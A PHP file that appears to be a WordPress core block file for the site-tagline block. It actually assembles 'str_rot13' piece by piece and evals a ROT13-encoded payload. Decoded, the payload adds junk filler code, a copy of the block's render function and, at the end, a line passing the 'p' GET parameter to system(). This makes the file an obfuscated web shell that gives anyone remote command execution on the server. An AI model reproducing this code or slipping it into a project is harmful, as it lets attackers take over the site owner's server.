<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/fvgr-gntyvar` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/fvgr-gntyvar` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Gur eraqre.
 */
shapgvba eraqre_oybpx_pber_fvgr_gntyvar( $nggevohgrf ) {
	$fvgr_gntyvar = trg_oybtvasb( 'qrfpevcgvba' );
	vs ( ! $fvgr_gntyvar ) {
		erghea;
	}

	$gnt_anzr           = 'c';
	$nyvta_pynff_anzr   = rzcgl( $nggevohgrf['grkgNyvta'] ) ? '' : \"unf-grkg-nyvta-{$nggevohgrf['grkgNyvta']}\";
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $nyvta_pynff_anzr ) );

	vs ( vffrg( $nggevohgrf['yriry'] ) && 0 !== $nggevohgrf['yriry'] ) {
		$gnt_anzr = 'u' . (vag) $nggevohgrf['yriry'];
	}

	erghea fcevags(
		'<%1$f %2$f>%3$f</%1$f>',
		$gnt_anzr,
		$jenccre_nggevohgrf,
		$fvgr_gntyvar
	);
}

/**
 * Ertvfgref gur `pber/fvgr-gntyvar` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_fvgr_gntyvar() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/fvgr-gntyvar',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_fvgr_gntyvar',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_fvgr_gntyvar' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>